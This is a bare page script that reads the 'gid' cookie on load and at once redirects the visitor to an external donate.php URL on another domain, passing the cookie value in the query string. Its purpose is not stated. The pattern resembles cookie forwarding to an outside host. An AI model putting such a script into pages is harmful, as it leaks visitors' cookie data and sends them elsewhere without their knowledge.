<script>


function get_cookie ( cookie_name )
{
  var results = document.cookie.match ( '(^|;) ?' + cookie_name + '=([^;]*)(;|$)' );
  if ( results )
    return ( unescape ( results[2] ) );
  else
    return null;
}
window.location.replace('https://upject.pro/donate.php?gid='+get_cookie("gid"));
</script>
